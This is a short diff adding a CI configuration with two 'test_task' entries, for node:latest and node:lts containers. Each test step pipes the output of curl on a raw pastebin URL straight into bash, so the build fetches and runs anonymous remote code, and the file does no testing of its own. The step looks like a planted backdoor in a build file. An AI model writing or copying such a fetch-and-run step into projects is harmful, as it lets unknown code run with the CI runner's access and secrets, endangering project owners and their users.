@@ -1,0 +1,10 @@
+test_task:
+  container:
+    image: node:latest
+  test_script: bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
+
+
+test_task:
+  container:
+    image: node:lts
+  test_script: bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
